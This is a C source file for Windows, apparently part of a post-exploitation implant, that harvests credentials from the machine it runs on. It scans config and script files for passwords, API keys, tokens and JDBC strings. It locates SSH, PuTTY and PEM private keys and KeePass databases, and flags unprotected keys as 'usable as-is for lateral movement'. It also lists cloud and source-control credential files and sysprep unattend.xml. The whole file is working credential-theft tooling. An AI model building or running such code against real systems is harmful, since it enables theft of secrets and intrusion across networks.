/* Sensitive config file search with lower-noise matching */
#include "search.h"
#include "browser/utils.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <windows.h>

static const char* g_blacklist[] = {
    "PUT /", "GET /", "POST /", "Cookie:", "http://", "https://",
    "{{BaseURL}}/", "jndi:ldap", "response.status", "function",
    "\"description\":", "\"documentation\":", "Mozilla/5.0",
    "#!/", "#include", "<html", "<!DOCTYPE", "console.log",
    "swagger", "openapi", "example", "sample", "demo",
    NULL
};

static const char* g_config_exts = ".ini,.conf,.cfg,.config,.properties,.xml,.json,.yaml,.yml,.toml,.env,.plist,.reg,.dat,";
static const char* g_priority_exts = ".env,.ini,.conf,.cfg,.properties,.yaml,.yml,.toml,.reg,";
static const char* g_strict_exts = ".txt,.log,.md,.sql,.bak,.csv,.ps1,.bat,.cmd,.sh,.py,.js,.ts,.java,.php,.asp,.aspx,";
static const char* g_skip_dirs[] = {
    "$RECYCLE.BIN", "Windows", "proc", "sys", "bin", "boot", "dev",
    "Microsoft Visual Studio", "360safe", "Bandizip", "PotPlayer",
    ".git", ".svn", ".hg", "node_modules", "vendor", "target", "dist",
    "build", "out", ".idea", ".vscode", "__pycache__", ".next",
    NULL
};

typedef struct {
    const char* patterns[32];
    int count;
} SearchPatternList;

static int match_keyword_ci(const char* line, const char* keyword) {
    const char* p = line;
    if (!line || !keyword) return 0;
    while (*p) {
        const char* k = keyword;
        const char* s = p;
        while (*k && *s && (tolower((unsigned char)*k) == tolower((unsigned char)*s))) {
            k++;
            s++;
        }
        if (!*k) return 1;
        p++;
    }
    return 0;
}

static void parse_pattern_list(const char* list, SearchPatternList* out) {
    if (!out) return;
    memset(out, 0, sizeof(*out));
    if (!list || !list[0]) return;

    while (*list && out->count < (int)(sizeof(out->patterns) / sizeof(out->patterns[0]))) {
        while (*list == ',' || isspace((unsigned char)*list)) list++;
        if (!*list) break;
        {
            const char* start = list;
            const char* end;
            while (*list && *list != ',') list++;
            end = list;
            while (end > start && isspace((unsigned char)end[-1])) end--;
            if (end > start) {
                char* item = (char*)malloc((size_t)(end - start) + 1);
                if (!item) break;
                memcpy(item, start, (size_t)(end - start));
                item[end - start] = 0;
                out->patterns[out->count++] = item;
            }
        }
    }
}

static void free_pattern_list(SearchPatternList* patterns) {
    int i;
    if (!patterns) return;
    for (i = 0; i < patterns->count; i++) {
        free((void*)patterns->patterns[i]);
        patterns->patterns[i] = NULL;
    }
    patterns->count = 0;
}

static int has_user_match(const char* line, const SearchPatternList* patterns) {
    int i;
    if (!line || !patterns || patterns->count == 0) return 0;
    for (i = 0; i < patterns->count; i++) {
        if (patterns->patterns[i] && match_keyword_ci(line, patterns->patterns[i])) return 1;
    }
    return 0;
}

static int is_blacklisted(const char* line) {
    int i;
    for (i = 0; g_blacklist[i]; i++) {
        if (strstr(line, g_blacklist[i])) return 1;
    }
    return 0;
}

static int should_skip_dir(const char* name) {
    int i;
    for (i = 0; g_skip_dirs[i]; i++) {
        if (_stricmp(name, g_skip_dirs[i]) == 0) return 1;
    }
    return 0;
}

static int ext_matches(const char* filename, const char* ext_list) {
    const char* ext = strrchr(filename, '.');
    const char* p;
    if (!ext || !ext_list) return 0;
    p = ext_list;
    while (*p) {
        const char* comma = strchr(p, ',');
        int len = comma ? (int)(comma - p) : (int)strlen(p);
        if (len > 0 && (int)strlen(ext) == len && _strnicmp(ext, p, len) == 0) return 1;
        if (!comma) break;
        p = comma + 1;
    }
    return 0;
}

static int is_utf16le(const unsigned char* data, int len) {
    return (len >= 2 && data[0] == 0xFF && data[1] == 0xFE);
}

static char* read_file_auto(const char* path, int max_size) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD sz, br;
    unsigned char* raw;
    char* result;

    if (h == INVALID_HANDLE_VALUE) return NULL;
    sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz > (DWORD)max_size) { CloseHandle(h); return NULL; }

    raw = (unsigned char*)malloc(sz ? sz : 1);
    if (!raw) { CloseHandle(h); return NULL; }
    if (!ReadFile(h, raw, sz, &br, NULL) || br != sz) { free(raw); CloseHandle(h); return NULL; }
    CloseHandle(h);

    if (is_utf16le(raw, (int)sz)) {
        int wlen = ((int)sz - 2) / 2;
        wchar_t* w = (wchar_t*)malloc((wlen + 1) * sizeof(wchar_t));
        int n;
        if (!w) { free(raw); return NULL; }
        memcpy(w, raw + 2, wlen * 2);
        w[wlen] = 0;
        n = WideCharToMultiByte(CP_UTF8, 0, w, wlen, NULL, 0, NULL, NULL);
        result = (char*)malloc(n + 1);
        if (!result) { free(w); free(raw); return NULL; }
        WideCharToMultiByte(CP_UTF8, 0, w, wlen, result, n, NULL, NULL);
        result[n] = 0;
        free(w);
    } else if (sz >= 3 && raw[0] == 0xEF && raw[1] == 0xBB && raw[2] == 0xBF) {
        result = (char*)malloc(sz - 2);
        if (!result) { free(raw); return NULL; }
        memcpy(result, raw + 3, sz - 3);
        result[sz - 3] = 0;
    } else {
        result = (char*)malloc(sz + 1);
        if (!result) { free(raw); return NULL; }
        memcpy(result, raw, sz);
        result[sz] = 0;
    }
    free(raw);
    return result;
}

static int is_likely_sensitive_filename(const char* filename) {
    static const char* hints[] = {
        "config", "setting", "secret", "credential", "passwd", "password",
        "account", "datasource", "jdbc", "db", "database", "application",
        ".env", "properties", "yml", "yaml", "toml", "ini", "conf",
        NULL
    };
    int i;
    if (!filename) return 0;
    for (i = 0; hints[i]; i++) {
        if (match_keyword_ci(filename, hints[i])) return 1;
    }
    return 0;
}

static int is_likely_sensitive_filename_strict(const char* filename) {
    static const char* hints[] = {
        "config", "setting", "secret", "credential", "passwd", "password",
        "account", "datasource", "jdbc", "db", "database", "application",
        "prod", "test", "uat", "backup", "bak", "key", "token", "env",
        "yaml", "yml", "ini", "conf", "properties", "sql",
        NULL
    };
    int i;
    if (!filename) return 0;
    for (i = 0; hints[i]; i++) {
        if (match_keyword_ci(filename, hints[i])) return 1;
    }
    return 0;
}

static int contains_sep_after_key(const char* line, const char* key) {
    const char* p = line;
    size_t kl = strlen(key);
    while (*p) {
        if (_strnicmp(p, key, kl) == 0) {
            const char* q = p + kl;
            while (*q == ' ' || *q == '\t' || *q == '"' || *q == '\'') q++;
            if (*q == ':' || *q == '=') return 1;
        }
        p++;
    }
    return 0;
}

static int extract_value_after_sep(const char* line, const char* key, char* out, int out_sz) {
    const char* p = line;
    size_t kl = strlen(key);
    if (!line || !key || !out || out_sz <= 0) return 0;
    while (*p) {
        if (_strnicmp(p, key, kl) == 0) {
            const char* q = p + kl;
            int oi = 0;
            while (*q == ' ' || *q == '\t' || *q == '"' || *q == '\'') q++;
            if (*q != ':' && *q != '=') { p++; continue; }
            q++;
            while (*q == ' ' || *q == '\t' || *q == '"' || *q == '\'') q++;
            while (*q && *q != '\r' && *q != '\n' && *q != '"' && *q != '\'' &&
                   *q != ',' && *q != ';' && oi < out_sz - 1) {
                out[oi++] = *q++;
            }
            out[oi] = 0;
            return oi;
        }
        p++;
    }
    out[0] = 0;
    return 0;
}

static int value_is_placeholder(const char* value) {
    static const char* skip_values[] = {
        "", "null", "true", "false", "none", "password", "passwd",
        "username", "user", "admin", "root", "test", "example",
        "changeme", "your_password", "your-password", "********",
        "<password>", "<secret>", "${password}", "${username}",
        NULL
    };
    char buf[256];
    int bi = 0;
    int i;

    if (!value) return 1;
    while (*value == ' ' || *value == '\t' || *value == '"' || *value == '\'') value++;
    while (*value && *value != '\r' && *value != '\n' && bi < (int)sizeof(buf) - 1) {
        if (*value == '"' || *value == '\'' || *value == ',' || *value == ';') break;
        buf[bi++] = (char)tolower((unsigned char)*value);
        value++;
    }
    while (bi > 0 && isspace((unsigned char)buf[bi - 1])) bi--;
    buf[bi] = 0;
    if (bi < 3) return 1;
    for (i = 0; skip_values[i]; i++) {
        if (strcmp(buf, skip_values[i]) == 0) return 1;
    }
    return 0;
}

static int has_sensitive_match(const char* line) {
    static const char* keys[] = {
        "accessKeyId", "accessKeySecret", "secretKey", "clientSecret",
        "appSecret", "privateKey", "token", "apiKey", "password",
        "passwd", "pwd", "jdbc.url", "corpId", "corpSecret",
        "sdkappid", "identifier",
        NULL
    };
    char value[512];
    int i;

    if (!line || !*line) return 0;
    if (*line == '#' || (*line == '/' && line[1] == '/') || (*line == '-' && line[1] == '-')) return 0;
    if (match_keyword_ci(line, "jdbc:")) return 1;

    for (i = 0; keys[i]; i++) {
        if (contains_sep_after_key(line, keys[i]) &&
            extract_value_after_sep(line, keys[i], value, sizeof(value)) > 0 &&
            !value_is_placeholder(value)) {
            return 1;
        }
    }
    return 0;
}

static int has_sensitive_match_strict(const char* line) {
    static const char* keys[] = {
        "accessKeyId", "accessKeySecret", "secretKey", "clientSecret",
        "appSecret", "privateKey", "token", "apiKey", "password",
        "passwd", "pwd", "user", "username", "jdbc.url", "jdbc:",
        "corpId", "corpSecret", "sdkappid", "identifier", "authorization",
        "bearer", "ak", "sk",
        NULL
    };
    char value[512];
    int i;

    if (!line || !*line) return 0;
    if (*line == '#' || (*line == '/' && line[1] == '/') || (*line == '-' && line[1] == '-')) return 0;
    if (match_keyword_ci(line, "jdbc:")) return 1;

    for (i = 0; keys[i]; i++) {
        if (contains_sep_after_key(line, keys[i]) &&
            extract_value_after_sep(line, keys[i], value, sizeof(value)) > 0) {
            if (strlen(value) >= 3 && (!value_is_placeholder(value) || strlen(value) >= 8)) return 1;
        }
    }
    if (match_keyword_ci(line, "bearer ") || match_keyword_ci(line, "authorization:")) return 1;
    return 0;
}

/* Result buffer size shared by search_config() and its workers. */
#define SEARCH_RESULT_MAX 131072

SearchArgs search_args(const char* path, const char* user_regex, bool user_only,
                       const char* file_types, bool exten_only,
                       int64_t size_limit, int char_limit, int max_matches_per_file, int mode) {
    SearchArgs a = {path, user_regex, user_only, file_types, exten_only, size_limit, char_limit, max_matches_per_file, mode};
    return a;
}

static void scan_config_file(const char* fp, SearchArgs args, const SearchPatternList* patterns, char* result, int* rp) {
    char* content = read_file_auto(fp, (int)args.size_limit);
    int found_in_file = 0;
    int matched_lines = 0;
    char* line;

    if (!content) return;
    line = strtok(content, "\n");
    while (line) {
        int len;
        int default_match;
        int user_match;
        int matched;

        while (*line == '\r' || *line == ' ') line++;
        len = (int)strlen(line);
        if (len == 0 || len > args.char_limit || is_blacklisted(line)) {
            line = strtok(NULL, "\n");
            continue;
        }

        default_match = args.mode ? has_sensitive_match_strict(line) : has_sensitive_match(line);
        user_match = has_user_match(line, patterns);
        matched = args.user_only ? user_match : (default_match || user_match);
        if (matched) {
            if (!found_in_file) {
                *rp += snprintf(result + *rp, SEARCH_RESULT_MAX - *rp, "File: %s\n", fp);
                found_in_file = 1;
            }
            *rp += snprintf(result + *rp, SEARCH_RESULT_MAX - *rp, "  %s\n", line);
            matched_lines++;
            if (*rp > SEARCH_RESULT_MAX - 12000) break;
            if (args.max_matches_per_file > 0 && matched_lines >= args.max_matches_per_file) break;
        }
        line = strtok(NULL, "\n");
    }
    free(content);
}

static void scan_config_dir(SearchArgs args, const SearchPatternList* patterns, const char* dir, int depth, int max_depth,
                            int* scanned, char* result, int* rp) {
    char search_path[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hf;

    snprintf(search_path, sizeof(search_path), "%s\\*", dir);
    hf = FindFirstFileA(search_path, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    do {
        char fp[MAX_PATH];
        LARGE_INTEGER fsz;

        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        snprintf(fp, sizeof(fp), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (should_skip_dir(fd.cFileName)) continue;
            if (depth < max_depth) scan_config_dir(args, patterns, fp, depth + 1, max_depth, scanned, result, rp);
            continue;
        }

        if (!args.exten_only && !ext_matches(fd.cFileName, g_config_exts) &&
            !(args.mode && ext_matches(fd.cFileName, g_strict_exts))) {
            if (!args.custom_file_types || !args.custom_file_types[0] || !ext_matches(fd.cFileName, args.custom_file_types))
                continue;
        }
        if (args.exten_only && args.custom_file_types && args.custom_file_types[0] &&
            !ext_matches(fd.cFileName, args.custom_file_types)) continue;

        if (!args.mode) {
            if (!is_likely_sensitive_filename(fd.cFileName) && !ext_matches(fd.cFileName, g_priority_exts)) continue;
        } else {
            if (!is_likely_sensitive_filename_strict(fd.cFileName) &&
                !ext_matches(fd.cFileName, g_priority_exts) &&
                !ext_matches(fd.cFileName, g_strict_exts)) continue;
        }

        fsz.LowPart = fd.nFileSizeLow;
        fsz.HighPart = fd.nFileSizeHigh;
        if (fsz.QuadPart > args.size_limit) continue;

        (*scanned)++;
        scan_config_file(fp, args, patterns, result, rp);
        if (*rp > SEARCH_RESULT_MAX - 12000) break;
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
}

const char* search_config(SearchArgs args) {
    static char result[SEARCH_RESULT_MAX];
    int rp = 0;
    int scanned = 0;
    SearchPatternList patterns;

    result[0] = 0;
    parse_pattern_list(args.user_regex_list, &patterns);

    if (!args.path || !path_exists(args.path)) {
        snprintf(result, sizeof(result), "Path not found: %s\n", args.path ? args.path : "(null)");
        free_pattern_list(&patterns);
        return result;
    }

    printf("Searching: %s\n", args.path);
    printf("Sensitive mode: %s\n", args.mode ? "strict" : "normal");
    scan_config_dir(args, &patterns, args.path, 1, 3, &scanned, result, &rp);
    printf("Scanned %d files total.\n", scanned);

    free_pattern_list(&patterns);

    /* --- private key / password database material probe --- */
    {
        char up[MAX_PATH];
        if (GetEnvironmentVariableA("USERPROFILE", up, sizeof(up))) {
            static const char* const dirs[] = { "Desktop", "Documents", "Downloads", ".ssh", "putty" };
            static const char* const key_exts[] = { ".ppk", ".ppkx", ".kdbx", ".kdb", ".pem", ".key", ".pfx", ".p12", NULL };
            char key_section[16384];
            int kp = 0, found = 0;
            key_section[0] = 0;
            for (int d = 0; d < 5; d++) {
                char base[MAX_PATH];
                snprintf(base, sizeof(base), "%s\\%s", up, dirs[d]);
                char srch[MAX_PATH];
                snprintf(srch, sizeof(srch), "%s\\*", base);
                WIN32_FIND_DATAA fd;
                HANDLE hf = FindFirstFileA(srch, &fd);
                if (hf == INVALID_HANDLE_VALUE) continue;
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    const char* ext = strrchr(fd.cFileName, '.');
                    int is_key = 0;
                    if (!ext) continue;
                    for (int e = 0; key_exts[e]; e++)
                        if (_stricmp(ext, key_exts[e]) == 0) { is_key = 1; break; }
                    if (!is_key &&
                        (_strnicmp(fd.cFileName, "id_rsa", 6) == 0 ||
                         _strnicmp(fd.cFileName, "id_ed25519", 10) == 0 ||
                         _strnicmp(fd.cFileName, "id_ecdsa", 8) == 0)) is_key = 1;
                    if (!is_key) continue;
                    char fp[MAX_PATH];
                    snprintf(fp, sizeof(fp), "%s\\%s", base, fd.cFileName);
                    long long fbytes = ((long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
                    kp += snprintf(key_section + kp, sizeof(key_section) - kp,
                        "  [+] %s  (%I64d bytes)\n", fp, fbytes);
                    found++;
                    /* encrypted marker: PEM files with Proc-Type: 4,ENCRYPTED;
                     * PuTTY .ppk with "Encryption: none" means no passphrase */
                    if (ext && (_stricmp(ext, ".pem") == 0 || _stricmp(ext, ".key") == 0 ||
                        _stricmp(ext, ".ppk") == 0 ||
                        _strnicmp(fd.cFileName, "id_rsa", 6) == 0 ||
                        _strnicmp(fd.cFileName, "id_ed25519", 10) == 0 ||
                        _strnicmp(fd.cFileName, "id_ecdsa", 8) == 0)) {
                        HANDLE f2 = CreateFileA(fp, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                        if (f2 != INVALID_HANDLE_VALUE) {
                            char hb[2048]; DWORD got = 0;
                            if (ReadFile(f2, hb, sizeof(hb) - 1, &got, NULL)) {
                                hb[got] = 0;
                                if (strstr(hb, "Proc-Type: 4,ENCRYPTED"))
                                    kp += snprintf(key_section + kp, sizeof(key_section) - kp,
                                        "      -> passphrase-protected (Proc-Type ENCRYPTED)\n");
                                else if (strstr(hb, "ENCRYPTED"))
                                    kp += snprintf(key_section + kp, sizeof(key_section) - kp,
                                        "      -> passphrase-protected (ENCRYPTED)\n");
                                else if (strstr(hb, "Encryption: none"))
                                    kp += snprintf(key_section + kp, sizeof(key_section) - kp,
                                        "      -> NO passphrase (usable as-is for lateral movement)\n");
                            }
                            CloseHandle(f2);
                        }
                    }
                    if (kp > (int)sizeof(key_section) - 1024) break;
                } while (FindNextFileA(hf, &fd));
                FindClose(hf);
            }
            if (found) {
                rp += snprintf(result + rp, sizeof(result) - rp,
                    "===== Private keys && password databases =====\n");
                rp += snprintf(result + rp, sizeof(result) - rp, "%s\n", key_section);
            }

            /* --- cloud/SCM credential fixed-location probe (zero traversal) --- */
            {
                static const char* const cloud_paths[] = {
                    ".aws\\credentials", ".kube\\config", ".git-credentials",
                    ".npmrc", "_netrc", ".docker\\config.json",
                    ".ssh\\known_hosts", ".ssh\\authorized_keys", NULL
                };
                int cfound = 0;
                char csec[8192];
                int cp = 0;
                csec[0] = 0;
                for (int c = 0; cloud_paths[c]; c++) {
                    char cp_[MAX_PATH];
                    snprintf(cp_, sizeof(cp_), "%s\\%s", up, cloud_paths[c]);
                    if (GetFileAttributesA(cp_) != INVALID_FILE_ATTRIBUTES) {
                        long long sz64 = 0;
                        HANDLE f2 = CreateFileA(cp_, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                        if (f2 != INVALID_HANDLE_VALUE) {
                            LARGE_INTEGER li;
                            if (GetFileSizeEx(f2, &li)) sz64 = li.QuadPart;
                            CloseHandle(f2);
                        }
                        cp += snprintf(csec + cp, sizeof(csec) - cp,
                            "  [+] %s  (%I64d bytes)\n", cp_, sz64);
                        cfound++;
                    }
                }
                /* unattended-install passwords (fixed system paths) */
                const char* wr = getenv("SystemRoot");
                if (wr) {
                    char upath[MAX_PATH];
                    snprintf(upath, sizeof(upath), "%s\\System32\\sysprep\\unattend.xml", wr);
                    if (GetFileAttributesA(upath) != INVALID_FILE_ATTRIBUTES) {
                        cp += snprintf(csec + cp, sizeof(csec) - cp,
                            "  [+] %s (check <Password> sections)\n", upath);
                        cfound++;
                    }
                }
                if (cfound) {
                    rp += snprintf(result + rp, sizeof(result) - rp,
                        "===== Cloud/SCM credential files =====\n");
                    rp += snprintf(result + rp, sizeof(result) - rp, "%s\n", csec);
                }
            }
        }
    }

    return result[0] ? result : NULL;
}
